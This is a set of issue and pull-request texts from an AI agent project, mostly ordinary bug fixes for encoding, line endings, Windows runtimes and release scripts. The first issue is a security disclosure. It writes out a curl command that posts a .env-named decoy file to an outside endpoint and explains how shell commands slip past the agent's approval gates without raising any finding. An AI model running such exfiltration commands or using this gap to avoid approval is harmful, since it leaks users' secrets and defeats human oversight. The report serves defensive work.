Searched open and closed issues for Hub/config.json permission failures, Docker permissions, UID, and Hub root ownership. #7612 concerns CLI authentication inside local sandboxes and appears to be a different issue.

issues.title: Security: shell-wrapped outbound actions (SMTP send / HTTP POST / @file-to-network) execute with no findings or approval at AUTO/SMART — detector gap in tool_guard AND governance lanes
issues.body:
## Summary

QwenPaw's shell-command gate layers do not detect or gate **outbound-capable shell commands**. Under `approval_level: AUTO` (and equally under SMART governance), a shell command that sends email or performs an HTTP POST — including exfiltration-shaped reads of local files passed to the network (`--data-binary @file`) — executes with **zero findings and zero approval pends**.

## Reproduction (verified 2026-10-25, installed v2.2.2, macOS arm64)

Three commands executed via the agent's execute-shell tool with agent `approval_level: AUTO` and governance `execution_level: smart`. All three ran to completion with **no approval card and no findings**:

1. `himalaya message send <raw_email>` — real self-addressed SMTP send; result: `Message successfully sent`.
2. `curl -X POST https://httpbin.org/post` — explicit network write; result: HTTP 200.
3. `curl -X POST --data-binary @.env-decoy https://httpbin.org/post` — adversarial exfil-shaped decoy: contents of an `.env`-named file transmitted over the network; the endpoint received the full body. (Decoy contents were explicitly fake test data staged in the run ledger for exactly this test.)

## Root cause

- `runtime/tool_guard.py`: the pend fires only on **findings emitted by content guardians**. The guardian set has no detector class for outbound-capable commands: SMTP senders (sendmail/mutt/msmtp/himalaya and similar), POST-class flags of `curl`/`wget`/`httpie`, and network reads of local files via `@file` / `-F @*` / `--data-binary @*`.
- SMART mode does not compensate: it only auto-allows INFO/LOW findings. Since no finding is ever emitted, nothing is pended or denied.
- The governance lane (`governance/<agent>_<hash>/policy.yaml` with `execution_level: smart` + exact-match `user_rules`) equally lacks outbound shape detection.
- MCP driver-card `ask` policies ARE enforced correctly (pend cards fire) — the gap is specific to the shell-content guardians and governance rules.

## Suggested fix

- Add an **outbound-capable-command guardian class**: SMTP senders, HTTP POST-class flags of common CLI tools, and local-file-to-network argument reads. Surface at MEDIUM+ severity so AUTO/SMART pend (or deny) per policy.
- Optional escape hatch: `security.tool_guard.outbound_allow` — per-agent allow-listing for trusted outbound commands (e.g., package managers) so the new detector does not create noise.
- Adding the same shapes to governance `user_rules` matching would restore parity across the two gate lanes.

## Verified non-affected path (same session)

The MCP card path was proven working end-to-end in the same run: `create_issue` produced a live approval pend card with exact payload, root-session routing, approve→executes, and unattended 300s timeout → deny-safe. The gap is confined to shell-content detection.

## Impact

An agent with shell access can silently exfiltrate any locally readable file (credentials, `.env`, private data) to an attacker-controlled endpoint **without any approval, finding, or audit trail**, under both AUTO and SMART configurations. The only compensating control currently available is operational discipline (restricting external sends to separately gated agent sessions), which is not a technical gate.

Environment: QwenPaw 2.2.2, macOS arm64 (Darwin 25.6.0), agent `approval_level: AUTO`, governance `execution_level: smart`. Repro details and in-run evidence available on request.

issues.title: [Bug] 桌面端 HTML 预览「在浏览器中打开」失效：中文路径弹「找不到文件」，工作区外文件点击无反应
issues.body:
## 环境

- QwenPaw Desktop **v2.3.0b1**（Windows 11 x64，系统区域中文，默认浏览器 Edge）
- 后端：`qwenpaw.exe --version` → `QwenPaw, version 2.3.0b1`
- 工作区路径包含中文目录（下文记作 `<workspace>`）
- 场景：Agent 生成一个依赖 JS 渲染的单文件 HTML（日报仪表盘），在右侧文件预览面板点「在浏览器中打开」

## 复现步骤 A（文件在工作区内，路径含中文）

1. 在工作区 `<workspace>\digest\us\report.html` 生成任意 HTML
2. 在预览面板点击「在浏览器中打开」

**实际结果**：弹出 Windows 对话框

```
file:///E:/%E5%B7%A5%E4%BD%9C%E5%8C%BA/digest/us/report.html
Windows 找不到文件
```

（URL 里的中文目录被 UTF-8 百分号编码）

**期望结果**：默认浏览器打开该文件。

## 复现步骤 B（文件在纯 ASCII 路径下）

1. 把同一个文件复制到 `<ascii-dir>\report.html`（全 ASCII，无空格）
2. 在预览面板点击「在浏览器中打开」

**实际结果**：**无任何反应**——不弹错误框、不新开窗口、不出新标签页，前台窗口仍是 QwenPaw，浏览器窗口标题未变。

**期望结果**：默认浏览器打开该文件。

## 系统层对照实验（排除文件损坏与关联问题）

在同一台机器上用 `ShellExecuteW`（shell32）分别打开三种形式：

| 传入形式 | 返回值 | 结果 |
|---|---|---|
| 原生路径 `<ascii-dir>\report.html` | 42 | **成功打开** |
| `file:///E:/<ascii-dir>/report.html`（纯 ASCII URL） | 42 | **成功打开** |
| `file:///E:/%E5%B7%A5%E4%BD%9C%E5%8C%BA/.../report.html`（UTF-8 百分号编码） | 2 | 失败（`ERROR_FILE_NOT_FOUND`） |

即：**文件本身可打开、系统关联正常、ASCII 的 `file:///` URL 也能打开**，问题出在应用传入的形式上。

## 分析（供参考）

1. **中文路径失败的机制**：Windows 对 `file:///` URL 的百分号解码使用当前 ANSI 代码页（中文系统为 GBK/936），而应用传的是 UTF-8 编码。`%E5%B7%A5%E4%BD%9C%E5%8C%BA` 被按 GBK 解码成乱码，路径不存在 → `ERROR_FILE_NOT_FOUND`。
   **建议**：调用 `ShellExecute` 时 `lpFile` 直接传**本地路径**（不要先转成 `file:///` URL 再百分号编码），或对含非 ASCII 字符的路径走 `os.startfile(path)` / `explorer.exe` 原生路径分支。

2. **工作区外文件点击无反应**：疑似 handler 以 `root`（工作区目录）为基准解析 `filePath`，文件在工作区外时解析失败并**静默 return**。
   **建议**：解析失败时至少给出 toast/错误提示；或对绝对路径直接放行。

3. **预览面板的认知成本**：预览不执行 JS，含动态内容的页面只显示模板骨架（本用例里显示的是模板默认标题与空容器），用户容易误判为「文件坏了」。建议动态内容场景下把「在浏览器中打开」做成明确可用的主操作，或提供「以独立窗口打开」。

4. **附带问题（可选）**：该窗口通过 UI Automation 枚举到 **0 个按钮/控件**（疑似 Qt WebEngine 未挂 UIA 桥），导致自动化测试与读屏软件都无法操作该界面。

## 影响

- 任何工作区路径含中文的 Windows 用户（国内用户大概率如此）都无法使用「在浏览器中打开」
- 生成的报告/看板类 HTML（依赖 JS 渲染）在应用内完全无法查看，只能由用户自己去资源管理器双击

*附：问题为使用过程中实测；系统层对照实验在同一台机器上可复现。*

prs.title: fix(tools): decode GBK/CP936 in read/edit/grep instead of dropping bytes
prs.body:
## What Problem This Solves

`read_file_safe` (used by `read_file` / `edit_file`) and `grep_search` decoded files as UTF-8 with `errors="ignore"`. On Chinese Windows, Notepad/legacy `.txt` / `.csv` / `.md` notes are often GBK/CP936. Every non-UTF-8 byte was deleted with no log line, so:

- `read_file` returned ASCII leftovers (e.g. `姓名: 张三` → `: `)
- `grep_search` for Chinese terms missed the file
- `edit_file` could still report success and persist the damaged snapshot as UTF-8

Markdown/skill loaders already use `decode_text_bytes_with_encoding_fallback` (utf-8 → gbk/cp936 → …). This PR routes the tool read path through the same helper.

## Changes

- `src/qwenpaw/agents/tools/utils.py`: `_read_file_safe_sync` uses the shared encoding fallback
- `src/qwenpaw/agents/tools/file_search.py`: `_walk_and_grep` reads bytes and decodes with the same fallback (files already capped at 2MB)
- Regression tests for GBK read, GBK `edit_file`, and GBK grep

## How to reproduce (before)

```python
from pathlib import Path
path = Path("note.txt")
path.write_bytes("姓名: 张三\n".encode("gbk"))
# read_file_safe previously returned ": \n"
```

## Testing

```bash
PYTHONPATH=src python -m pytest \
  tests/unit/agents/tools/test_file_io.py \
  tests/unit/agents/tools/test_file_search.py::test_walk_and_grep_matches_gbk_file -q
# 43 passed
```

Also re-ran the new GBK cases alone after rebase: 4 passed.

## Notes

- After a successful GBK decode, `edit_file` still writes with the existing suffix-based encoding (`.txt` → `utf-8-sig`). Chinese text is preserved; only the on-disk encoding may change to UTF-8, which matches the project’s Windows Excel/Notepad write path.
- CRLF whole-file rewrite and Ollama `num_ctx` sizing are separate follow-ups and are not in this PR.

Happy to adjust if maintainers prefer preserving the original GBK bytes on write as well.

prs.title: fix(hub): make Windows local runtime readiness reliable
prs.body:
## Description

Windows AppContainer Hub runtimes were killed at the cross-platform `LocalProcessRuntimeProvisioner` startup budget of 30 seconds while still initializing. The runtime log shows the HTTP server becoming ready and Uvicorn binding shortly after the Hub gives up; first-run skill installation, workspace migration, and agent bootstrap can take longer than 30 seconds inside an AppContainer. The E2E budget was already raised from 60s to 120s (#7273), but the product readiness path was not.

This change uses a 120-second startup budget on Windows only; Linux and macOS keep the existing 30-second budget. It also adds debug logs for readiness probes and reverse-tunnel handshakes (control/data connection pairing and relay byte counts) so future timeouts can be diagnosed without guessing. No protocol or API changes.

**Related Issue:** Relates to #8565

**Security Considerations:** No trust-boundary change. Log messages include runtime IDs, ports, and connection IDs; they do not log the tunnel token or request headers.

prs.title: fix(skills): stage skill copies inside the target workspace
prs.body:
## Description

Windows Hub Local runtimes could not install their default skills. `staged_skill_dir()` used `tempfile.mkdtemp()` under the runtime process temp directory (`working/tmp`). Inside an AppContainer, directories created there receive a protected DACL that only grants `OWNER RIGHTS`, `SYSTEM`, and `Administrators`; the AppContainer SID is absent, so creating the nested skill directory (`QA_source_index`) fails with `WinError 5`. On Python builds where `TMP_MAX` is `2147483647`, `tempfile.mkdtemp()` also spins in its `PermissionError` retry loop instead of raising, which makes the runtime look hung.

This change lets `staged_skill_dir()` accept an explicit `root_dir` and makes `SkillPoolService.download_to_workspace()` stage inside the destination workspace's `skills/` directory. That directory is part of the existing writable AppContainer mount and its children remain writable. Callers that do not pass `root_dir` keep the previous temp-directory behaviour.

**Related Issue:** Relates to #8565

**Security Considerations:** No trust-boundary change. The staging directory still uses the fixed `qwenpaw_skill_stage_` prefix and `safe_skill_dir()` for path-injection hardening, and staging stays inside the per-runtime workspace mount instead of the shared system temp directory.

prs.title: fix(windows): fall back when CPU architecture is missing
prs.body:
## Description

Managed Windows runtimes can start with a minimal process environment where `platform.machine()` returns an empty string because `PROCESSOR_ARCHITECTURE` is absent. Local-model initialization then fails with `RuntimeError: Unsupported architecture:`. This is one of the independent failures described in #8565.

This change makes `get_architecture()` fall back on Windows only:

1. `PROCESSOR_ARCHITEW6432` (the native architecture under WOW64),
2. `PROCESSOR_ARCHITECTURE`,
3. `sysconfig.get_platform()` (for example `win-amd64` / `win-arm64`).

Non-Windows behaviour is unchanged: an empty `platform.machine()` still returns an empty string rather than guessing.

**Related Issue:** Relates to #8565

**Security Considerations:** No trust-boundary or authorization change. The environment values are used only to classify the local CPU architecture.

prs.title: fix(ollama): size context window from num_ctx instead of 128k default
prs.body:
## What Problem This Solves

Ollama already opts out of the static cloud context catalog (`_context_catalog_enabled → False`), which is correct: a local `qwen3-coder:30b` truncates at `num_ctx`, not at the family's cloud window.

But discovery never filled that gap. `fetch_models` reused the OpenAI `/v1/models` parser, whose rows do not carry `context_length` / `num_ctx`, so every Ollama model stayed at the **128k placeholder**. Compaction then compared against `0.8 × 131072` while the server often serves a few thousand to a few tens of thousands of tokens.

This is **independent of #7979** (and of open PR #7986):

| | #7979 / #7986 | This PR |
|---|---|---|
| Provider | custom / llama.cpp OpenAI-compatible | built-in **Ollama** |
| Failure mode | cloud catalog matches alias → **1M** | catalog already skipped → **128k default** |
| Fix | skip pattern catalog for custom endpoints | read native Ollama context into `max_input_length_auto_detected` |

A fix for #7979 does not call `/api/show` or `/api/ps`, and does not change Ollama.

## Changes

`OllamaProvider.fetch_models` lists models with `/v1/models`, then sets `max_input_length_auto_detected` from native Ollama signals. Precedence:

1. `GET /api/ps` served `context_length` when the model is loaded (reflects `OLLAMA_CONTEXT_LENGTH` and the load-time window). A hit skips `/api/show`.
2. Modelfile `num_ctx` from a successful `POST /api/show`.
3. A conservative **4096** estimate only after a **successful** `/api/show` that has no `num_ctx`. **4096 is a conservative estimate, not a value Ollama reports.** It matches Ollama's smallest documented default so first-session compaction does not assume 128k.

GGUF `*.context_length` is **not** used. That field is the model's maximum supported context, not the window Ollama is serving.

Failed native probes (`None`, 401, 403, timeout, or an invalid payload) leave the model **unchanged**. The 128k default remains until a later successful probe. A failed `/api/show` does not apply 4096.

`check_model_connection` uses the lightweight `/v1/models` list (`super().fetch_models`). It only checks that the model id exists and does not call `/api/show` per model.

Native `/api/ps` and `/api/show` probes reuse `_build_default_headers()` and add `Authorization: Bearer` when an API key is set and Authorization is not already configured. Explicit user `max_input_length` still wins over auto-detection, and the cloud catalog stays disabled for Ollama. `ModelInfo.max_input_length_auto_detected` allows `ge=1` so a small explicit `num_ctx` (for example 512) is kept.

## Testing

```bash
PYTHONPATH=src python -m pytest \
  tests/unit/providers/test_ollama_provider.py \
  tests/unit/providers/test_context_windows.py -q
# 87 passed
```

`black --line-length=79` is clean on the touched files.

Coverage includes precedence (served `/api/ps` → Modelfile `num_ctx` → conservative 4096 only after a successful show with no `num_ctx`), GGUF `*.context_length` ignored, 401/403 and timeout on `/api/show` leaving `max_input_length_auto_detected` unset, `check_model_connection` not calling `/api/show`, authenticated native probes, the catalog still skipped without detection, and explicit `max_input_length` still winning over auto-detected values.

When a text-only reply triggers a qualitative self-check, the assistant sometimes promises more work and stops before delivering it. Standard and custom qualitative rubrics can now ask the agent’s configured decision model (or the global default) to flag a possible omission for the assistant to verify.

prs.title: fix(providers): reject out-of-range model config values on the write path
prs.body:
Fixes #8549

## What Problem This Solves

`ModelInfo` declares `thinking_budget >= 1` and `max_input_length >= 1000`, but the write path never enforced those bounds: `Provider.update_model_config` assigned `int(...)` results directly (Pydantic does not validate plain attribute assignment), and `ModelConfigRequest.thinking_budget` was the only numeric field in its model without a bound. An invalid value was accepted and persisted, then failed re-validation on every read — after a restart `load_provider` returned `None` and the provider silently disappeared.

## What changed

- `app/routers/providers.py`: add `ge=1` to `ModelConfigRequest.thinking_budget`, matching the existing `ge=1000` on `max_input_length`.
- `providers/provider.py`: `update_model_config` now raises `ValueError` for `thinking_budget < 1` and `max_input_length < 1000` before assigning, consistent with the existing `model_type` / `supports_*` validation in the same method.
- `providers/model_info.py`: `thinking_budget_range` gains a model validator requiring a complete, ordered `[min, max]` pair (mirroring `ThinkingControl` in `providers/thinking.py`); previously `[8000]` constructed fine and `thinking_control()` crashed unpacking it.

## Evidence

New regression tests (10):

- `tests/unit/providers/test_provider_config_validation.py` — `thinking_budget` of -5 / 0 and `max_input_length` of 500 are rejected and not stored; valid values round-trip and clearing with `None` still works; `thinking_budget_range` of length 1 / 3 or `low > high` is rejected, an ordered pair still drives `thinking_control`.
- `tests/unit/app/routers/test_provider_config_request_validation.py` — `ModelConfigRequest(thinking_budget=-5 / 0)` fails request validation, `1` is accepted.

Red/green: with the fix reverted, the 8 rejection tests fail (the 2 valid-value guards pass both ways); with the fix, all 10 pass. The reproduction script that previously showed `update_model_config(..., -5)` returning `True` and poisoning reads now raises `ValueError: thinking_budget must be at least 1` at write time.

Broader subset `tests/unit/providers/` + the provider router tests: 1008 passed; the single failure (`test_typesafe_evaluation.py::test_as_model_injects_same_instance_and_preserves_host_headers`) fails identically on the unmodified baseline in this environment because the optional `reme` package is not installed.

prs.title: fix(tools): preserve CRLF line endings in edit_file
prs.body:
## What Problem This Solves

`edit_file` does not patch bytes in place. It reads a snapshot through `read_file_safe` (which normalizes every newline to `\n`) and then atomically replaces the file via `write_text_atomic` (`newline="\n"`). On a Windows CRLF checkout, a one-line string replace therefore rewrites the whole file as LF, so Git shows every line changed.

This is separate from #8234 (GBK/encoding fallback) and from #7091 (workspace editor CRLF). Only the agent `edit_file` tool path is changed here.

## Changes

- `src/qwenpaw/agents/tools/utils.py`: add `read_file_native` to retain original newline sequences, and `replace_text_preserving_newlines` to perform replacements on an LF-normalized view while preserving uniform and mixed on-disk line endings
- `src/qwenpaw/agents/tools/file_io.py`: `edit_file` reads the native snapshot and offloads newline-preserving replacement through `run_sync_io` before the atomic write
- Regression tests: preserve LF, CRLF, lone CR, and mixed line endings; cover multi-line and repeated replacements, newly introduced line breaks, and lone CR/LF boundary cases


## How to reproduce (before)

```python
from pathlib import Path
path = Path("app.py")
path.write_bytes(b'def hi():\r\n    return "old"\r\n')
# after edit_file(..., "old", "new"):
#   b'def hi():\n    return "new"\n'   # whole-file LF rewrite
```

## Testing

```bash
PYTHONPATH=src python -m pytest tests/unit/agents/tools/test_file_io.py -q
# 76 passed
```

## Notes

- Read-side LF normalization for the model is unchanged; only the write-back preserves the on-disk style.
- Truncation past `MAX_FILE_READ_BYTES` and Ollama `num_ctx` sizing are separate follow-ups and are not in this PR.

Mixed-line-ending files retain their original per-line endings; newly introduced breaks follow the style of the replaced span.

prs.title: fix(plugins): report an unusable dependency state root at startup
prs.body:
## Description

On restricted POSIX deployments, an unusable passwd home can make QwenPaw fail during import with a bare filesystem exception. This change reports `DEPENDENCY_STATE_ROOT_UNAVAILABLE` during state-root selection, naming the source, reason and `QWENPAW_DEPENDENCY_STATE_DIR` remedy.

The startup probe must not reject a working configuration. An existing coordination root can be read-only while its prepared per-environment subdirectories remain writable: lease files and maintenance markers are written inside those subdirectories, so creating a missing directory needs write permission on its parent, but using an existing one does not. The probe now requires `W_OK` only where a directory will actually be created; an existing root is left to be validated by the real filesystem operation, whose failure keeps its original `OSError` type so `install_lock.py`'s `InstallLockError` handling still applies.

POSIX selection remains: explicit override → absolute passwd home → absolute `HOME` fallback. The deployment guide documents the override and requires every process sharing a dependency environment to resolve the same root.

**Related Issue:** Refs #8515 (diagnostics and documentation).

**Security Considerations:** The existing `HOME` fallback can still select different roots when no absolute passwd home is available. Restricted deployments should configure one shared absolute override.

## Type of Change

- [x] Bug fix
- [x] Documentation

## Component(s) Affected

- [x] Core / Backend
- [x] Tests
- [x] Scripts / Deploy

## Changes

- Probe the proposed POSIX home-derived coordination directory before canonicalization and report unusable paths with actionable context.
- Accept an already prepared, writable coordination directory under a read-only home.
- Require `W_OK` only where a directory will actually be created; do not reject an existing read-only coordination root whose prepared per-environment subdirectories are writable.
- Add seven regressions: unusable passwd home, dangling coordination link, read-only home, prepared root under a read-only home, one root shared by processes with different `HOME` values, read-only root with prepared per-environment subdirectories, and a read-only root with no prepared subdirectories deferring to the actual operation.
- Document the override in `deploy/DEPENDENCY_MAINTENANCE.md`.

The probe is best effort; later writes can still fail because of filesystem changes, capacity limits or races. Explicit overrides and Windows are not probed. When a root is accepted but a needed subdirectory cannot be created, the failure surfaces from the filesystem operation itself rather than from selection.

## Checklist

- [ ] Full-repository `pre-commit run --all-files` passes
- [x] Relevant tests pass
- [x] Documentation updated

## Testing

Run `pytest tests/unit/plugins/test_install_lock.py -v -rs`, including a non-root run for permission-bit cases (root ignores directory permission bits). Both columns below use the same Python 3.12 virtualenv.

## Evidence

Linux, current PR head `dd71ddd8`:

| Scope | root | uid 65534 |
|---|---|---|
| `state_root` tests (`-k state_root`) | 7 passed / 4 skipped | 11 passed |
| Complete `test_install_lock.py` | 33 passed / 7 skipped | 38 passed / 2 skipped |

The two new permission-bit regressions fail against the previous head `4943c14c` (2 failed) and pass on this head; they are not tautological.

Real filesystem comparison with uid 65534 and a home owned by that uid with mode `0500`: baseline raises `PermissionError`; patched selection raises `DEPENDENCY_STATE_ROOT_UNAVAILABLE` with "not writable" and the override remedy. This is the missing-directory case, where the probe still applies.

With the coordination root itself at mode `0555` and its prepared per-environment subdirectories writable, base `c26d31c0` and this head both admit lease acquisition and maintenance, while the previous head `4943c14c` rejected the root at selection with "not writable". With no prepared subdirectory, selection no longer guesses: the failure comes from the actual operation with its original `OSError` type.

Two-process comparison with different `HOME` values and a valid absolute passwd home: base and PR head select the same root, see the peer reader, and reject maintenance with `DEPENDENCY_ENVIRONMENT_BUSY`. After the reader releases, maintenance succeeds on both.

Changed-file pre-commit hooks passed when the PR was first published. The full-repository gate remains unchecked; the broader process-isolation/plugin-process run has failures reproduced on both base and patched source. These are source checks, not fnOS or wheel acceptance.

prs.title: feat(console): add plugin-facing theme token overrides
prs.body:
## What Problem This Solves

Plugins could only recolour the chat via `chat.theme.set({ colorPrimary })`: there was no way to express a light/dark pair, and no way to touch layout roles (surface, border, text…) at all. #8071 settled on a deliberately small set of six semantic tokens for that.

There is a second, sharper problem behind the "dark-mode surface does not change" report: the console applies the user's theme preset as **inline custom properties on `<html>`** (`--app-surface`, `--app-accent`, … in `App.tsx`), and inline author declarations outrank every stylesheet rule. So a plugin that emitted `--app-surface` in a `<style>` element lost on **all six built-in presets**, silently — the UI kept the preset colour with no error.

## Summary

- `QwenPaw.chat.theme.overrideTokens(pluginId, tokens)` accepts the six `styles/tokens.css` roles without the `--app-` prefix: `bg`, `surface`, `surface-raised`, `border`, `text`, `text-secondary`. Each value must carry **both** `light` and `dark`; unknown keys and half-specified values throw, so a typo surfaces instead of rendering an unchanged UI.
- Registrations go through the existing `chatExtensions` stacks, so per-token LIFO, dispose-fallback to the previous registration and `disposeAll(pluginId)` on plugin unload all come from the one lifecycle that every other chat slot already uses.
- The winning value per token is projected into a single managed `<style>` element with `:root` and `html.dark-mode` blocks. Declarations are emitted with `!important` — the one lever a stylesheet has over `<html style>` — so the plugin layer outranks the preset without touching it. The preset keeps living in the inline `style` attribute, so removing the last override (dispose, or plugin unload on logout) restores the user's current preset exactly, with no extra round-trip.
- The startup hook now lives in `ConsoleApp.tsx` (where host initialisation moved in #8477-era main), before any plugin module loads.
- The public plugin SDK surface is updated in `src/qwenpaw/plugins/frontend/host.d.ts`.

## Evidence

New integration test (`console/src/plugins/themeTokens.integration.test.ts`) drives the real registry and projection, and asserts **`getComputedStyle(document.documentElement)`** — the value the user actually sees — not the text of the emitted stylesheet:

1. preset applied inline (`--app-surface: #ffffff`) → computed `#ffffff`;
2. plugin registers → light `#123456`, dark `#0a0a0a` (the preset is still inline and still loses);
3. preset switched to `#eeeeee` while the plugin is active → computed stays `#0a0a0a`;
4. `dispose()` → stylesheet removed, computed back to `#eeeeee`;
5. `disposeAll(pluginId)` (plugin unload / logout) → same restore;
6. two plugins take turns → LIFO fallback, then the preset.

Test run (local, Windows, QwenPaw `2.2.2.post1` tree at `18e554bf`):

```
src/plugins/themeTokens.test.ts                 6 passed
```

prs.title: ci(release): resolve desktop artifacts by id so duplicate names cannot break publish
prs.body:
> **Submitted by**: 秦琼·CIOps@QPQAT

## What this fixes

A release run that gets cancelled and then re-run keeps **every attempt's artifacts under the same name**. `scripts/pack/download_desktop_artifacts.sh` listed them with `--jq '.artifacts[] | ... | .name'` and appended each line to `selected[]` **without de-duplication**, then downloaded every entry into `--dir "$name"`.

With two copies of `QwenPaw-Desktop-Tauri-macOS-2.3.0b2` present, the helper downloaded that name **twice into one directory** and the second extraction aborted:

```
error downloading QwenPaw-Desktop-Tauri-macOS-2.3.0b2: error extracting zip archive:
error extracting "QwenPaw-Tauri-2.3.0b2-macOS.zip": openat QwenPaw-Tauri-2.3.0b2-macOS.zip: file exists
##[error]Desktop artifacts remained unavailable or corrupt after 2 attempts
```

Both publish jobs (`upload-release`, `upload-oss`) died on that step, so `finalize`, `deploy-website`, `promote-desktop` and `duty-issue` were all skipped and the draft release kept **zero desktop assets**. Real case: run [`41035310997`](https://github.com/agentscope-ai/QwenPaw/actions/runs/41035310997) attempt 3, draft `v2.3.0-beta.2` left at `assets=0`.

Retrying could never help: the attempt loop re-listed the same two copies and hit the same collision, and `cleanup_downloads` runs once per attempt rather than between names.

## Why not just de-duplicate the names

`gh run download` only accepts `--dir` / `--name` / `--pattern` — there is **no way to select one artifact by id**. So after de-duplicating we would still pass a bare name and `gh` would decide which copy to fetch, which can silently pick the **older** attempt's build. Turning a loud crash into a silently stale release is worse, so the copies are resolved explicitly instead.

## Changes

`scripts/pack/download_desktop_artifacts.sh` only (+123 / −23). Upload-side workflows are untouched.

1. **List by id, not by bare name** — `--jq '[.id, .created_at, .name] | @tsv'`.
2. **New `resolve_selection()`** keeps the newest copy per matching name (ISO-8601 UTC sorts lexicographically; numeric id breaks exact ties) and emits `<name>\t<id>` pairs. A dropped duplicate is reported as a `::warning::` so an unexpected extra copy stays visible in the job log instead of surfacing two steps later as a corrupt artifact.
3. **Download by id** through `gh api repos/<repo>/actions/artifacts/<id>/zip`, written to `${name}.zip.partial` and removed only on success, so a truncated transfer can never be mistaken for a complete artifact.
4. **New `extract_artifact()`** unpacks with python3: `testzip()` pre-check, **POSIX mode bits restored from `external_attr`**, and paths escaping the target directory are rejected. `python3 -m zipfile -e` silently drops mode bits (a `0755` entry comes back `0644`), which would strip the executable bit from the macOS `.app` payload while every step still reported green.
5. `cleanup_downloads()` now also removes `${name}.zip.partial`.

The two strings asserted by `tests/unit/tauri/test_desktop_workflows.py::test_download_helper_resolves_verifier_from_its_own_checkout` are preserved verbatim.

## Verification

CI cannot cover this change: `scripts/pack/**` matches none of the `paths` filters in `tests.yml`, so the unit test that asserts this script's content does not run when the script changes. Everything below was therefore run locally.

| Check | Result |
|---|---|
| `bash -n` | pass |
| `tests/unit/tauri/test_desktop_workflows.py` — the 6 assertions touching this script/workflows | **6 passed, 0 failed** |
| Old selection logic fed the real duplicate listing from run `41035310997` | `selected` = `[macOS, macOS, Windows]` — reproduces the incident exactly |
| New `resolve_selection()` on the same input | selects macOS **once**, picks the newer id `12976234290`, warns about dropped `12971716292` |
| Negative control — listing **without** duplicates | new and old select the identical set |
| End-to-end with the real 955,499,745-byte Windows artifact | download RC=0, unpack RC=0, yields `QwenPaw-Tauri-2.3.0b2-Windows-setup.exe` (959,765,766 bytes) + `.sha256` sidecar |
| `verify_desktop_artifacts.py --require windows` on the unpacked tree | **RC=0** — `verified windows artifact: … (959765766 bytes)` |
| Independent sha256 recomputation | `e307ebaab4cfd5043d47eca3d9551cdf148a41474d55ee170118185abfb09f20` matches the sidecar, so extraction is byte-identical |
| Mode-bit round trip (0755 / 0644 fixture) | `python3 -m zipfile -e` → both `0644` (bits lost); `extract_artifact` → `0755` / `0644` restored |
| `pre-commit run --files scripts/pack/download_desktop_artifacts.sh` | RC=0 — note 16 of 17 hooks report `no files to check` because `^scripts/pack/` is excluded in `.pre-commit-config.yaml`; only `detect-private-key` actually ran |

## Side effect: peak disk usage

Downloading to `${name}.zip.partial` keeps the archive and its extracted tree on disk at the same time, which the previous `gh run download --dir "$name"` path may not have (gh handles its own temporary storage internally; **its peak was not measured for comparison**).

Measured on the real artifacts of run `41035310997`, processing one platform at a time:

| Platform | archive | extracted | peak for that platform |
|---|---|---|---|
| Windows | 955,499,745 B (911 MiB) | 959,765,766 B (915 MiB) | **1.78 GiB** (`du` on the unpacked tree: 912M + 916M = 1.8G) |
| macOS | 1,227,545,728 B (1171 MiB) | not downloaded here (payload is an already-compressed `.app.tar.gz`, so ~1171 MiB) | ~2.28 GiB |

Names are processed serially and each archive is deleted right after its extraction succeeds (`rm -f -- "$zip_path"`), so the worst case is roughly *previous platform's extracted tree + current platform's archive + current extracted tree* ≈ **3.2 GiB** — well inside the 14 GB of a GitHub-hosted runner, but worth stating because the same job also handles `qwenpaw-docker-image` (2.0 GB).

There is no toggle: this helper is only ever invoked from the two desktop publish jobs, and a partial archive that is *not* cleaned up would be worse than the extra peak, since `cleanup_downloads` now removes `${name}.zip.partial` on every retry and on failure.

## Relationship to #7641

`download_desktop_artifacts.sh` and its verifier were introduced by #7641 ("fix(release): retry and verify desktop artifact downloads"), which addressed **partial downloads from network timeouts** — hence `--attempts`, `cleanup_downloads` and the sha256 sidecar checks.

This PR is not an alternative to that work; it builds on it. #7641's retry loop assumes a name maps to one artifact, which holds within a single attempt but not across attempts of a re-run release. The two changes compose: `--attempts` still guards against a truncated transfer of the *chosen* copy, while id-based selection guarantees there is exactly one chosen copy per name. `verify_desktop_artifacts.py` and its test are left untouched.

## Scope

Only the desktop publish helper is changed. No workflow, no product code, and no artifact is modified by this PR.
